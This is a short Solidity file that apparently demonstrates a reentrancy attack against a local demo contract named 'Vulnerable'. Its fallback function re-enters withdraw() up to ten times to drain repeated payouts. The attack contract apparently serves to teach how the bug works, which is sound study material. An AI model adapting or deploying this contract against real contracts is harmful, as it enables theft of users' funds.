pragma solidity >0.4.99 <0.6.0;

import "./Vulnerable.sol";

contract Attacker {
  Vulnerable private vulnerable;
  uint256 private count;

  constructor(address _vulnerableAddr) public {
    vulnerable = Vulnerable(_vulnerableAddr);
    count = 0;
  }

  function () payable external {
    if (count < 10) {
      count++;
      vulnerable.withdraw();
    }
  }

  function deposit() payable public {
    vulnerable.deposit.value(msg.value)();
  }

  function attack() public {
    vulnerable.withdraw();
  }
}
